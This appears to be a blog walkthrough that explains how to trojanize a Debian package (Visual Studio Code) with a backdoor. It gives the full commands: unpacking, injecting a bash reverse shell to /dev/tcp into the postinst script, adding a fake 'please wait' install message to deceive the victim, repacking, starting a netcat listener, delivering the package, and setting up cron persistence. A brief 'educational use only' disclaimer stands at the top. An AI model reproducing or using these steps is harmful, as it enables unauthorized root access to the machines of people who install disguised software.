---
title: "Linux Backdoor"
date: 2024-01-01
tags: ["Linux", "Backdoor"]
author: "Fernandez"
summary: "Click to read the full walkthrough."
---

# LINUX-BACKDOOR
![Mr Robot](https://raw.githubusercontent.com/JustFernandezz/LINUX-BACKDOOR/44fad3599ebd326a9e78ba1eca38bc5b2e66a814/Images/mrrobot.webp)
# Educational use only. Unauthorized use is illegal, else you might learn the hard way. Don't Play! #
# Welcome Folks! #
Today, I decided to post a simple walkthrough showing how to inject a backdoor into a linux debian package(.deb).

A Backdoor is simply a payload/malware that is secretly planted into a computer or software for unauthorized access.

To get started, we need a debian package to inject the backdoor into. You can download any debian package, but I'll be making use of the visual studio code debian package. You can grab it here: <a href="https://code.visualstudio.com/docs/setup/linux#_install-vs-code-on-linux">Visual_Studio.deb</a>.

First Step is to download the package and extract using the command below.
```bash
dpkg -x code_1.108.2-1769004815_amd64.deb code_pack
```
code_pack is the new directory we extracted to, you can name it anything you like.
<img width="1552" height="261" alt="Screenshot (46)" src="https://github.com/user-attachments/assets/a6c34e4b-01cf-46d8-956c-a2a06dc0d3d3" />

Confirm you now have the code_pack directory using "ls".

Next we need to extract the control and postinst files, these are the files we will be using to embed the backdoor into the package before rebuilding. To do this, we will extract the package again using:
```bash
ar -x code_1.108.2-1769004815_amd64.deb code_pack
```
<img width="1577" height="198" alt="Screenshot (47)" src="https://github.com/user-attachments/assets/b93755cb-6c9d-40e3-ad30-49889a018557" />

After  extracting, you see a file name "control.tar.xz". Now extract the file tar package using:
```bash
tar -xvf  control.tar.xz
```
We now have the postinst and control files we need.
<img width="1526" height="254" alt="Screenshot (50)" src="https://github.com/user-attachments/assets/8f580f0f-50b4-4509-a1fa-49c05baa7b29" />

Go to the code_pack directory and create a sub directory called "DEBIAN". Copy the postinst and control files we extracted to this DEBIAN directory.
<img width="1906" height="376" alt="Screenshot (51)" src="https://github.com/user-attachments/assets/9404b814-808e-4962-9efa-1591577dec1e" />.

We now have the two files in the DEBIAN directory, next is to edit the postinst file with any file editor of your choice(nano or vim). I will be using vim
```bash
sudo vim postinst
```
Now inject the highlighted payloads into the lines of code, together with a message telling the victim to wait while the package is installing.
```bash
sudo bash -i >& /dev/tcp/192.168.100.13/2020 0>&1
echo "Please wait, this might take sometime to install....."
```
<img width="1920" height="653" alt="Screenshot (53)" src="https://github.com/user-attachments/assets/3f98efca-1554-46bd-88b5-e9c1fc1a9cf8" />

Replace ip address and port number with your local machine's.

Save and close the file when you're done. Then change permission of the two files to 755 using chmod:
```bash
chmod 755 postinst control
```
Repack the code_pack back to the deb package with:
```bash
sudo dpkg-deb --build code_pack/
```
Might take sometime to repack, then you see the code_pack.deb package after.
<img width="1513" height="139" alt="Screenshot (57)" src="https://github.com/user-attachments/assets/b4002a3a-5832-4c78-966e-8a1747238c60" />
<img width="561" height="44" alt="Screenshot (58)" src="https://github.com/user-attachments/assets/4fd0445d-1c3a-4ea6-b1dc-544ac14359a8" />

Next thing is to open a netcat connection on the attacker machine and make sure the ip address and port number correlates with what you injected in the payload so as to listen for a reverse connection from the victim's system and have remote access. The ip address and port number used was 192.168.100.13 and 2020, so:
```bash
nc -lvp 2020
```

After this, we need to transfer the new code_pack.deb we just repacked to the victim machine. You can use any data delivery method you want (flash drives, ssh, python server, any...). Just get it transferred to the victim system

Once transferred, Let's assume you're the victom, install the package on the victim's system using:
```bash
sudo dpkg -i code_pack.deb
```
<img width="1272" height="443" alt="Screenshot (55)" src="https://github.com/user-attachments/assets/7d8519e9-4da1-43a6-b1be-294e08049bf7" />

You can see it is stuck while installing with a message saying "please wait, this might take sometime to install". This is just to fool the victim, letting him think it's taking time to install while the attacker is controlling his system. If we we switch back to the attacker machine, we can see we have remote access while the victim still waits for the never ending installation  process.
<img width="1920" height="542" alt="Screenshot (54)" src="https://github.com/user-attachments/assets/ccb6a984-827e-4427-98db-427e905d9372" />
<img width="1920" height="316" alt="Screenshot (56)" src="https://github.com/user-attachments/assets/5f2db8b7-050f-4068-8529-b760f168a976" />

Finally, once you establish remote access to the root account from the attacker machine, you can schedule as a cron job to install the package at a given duration which gives you persistence.
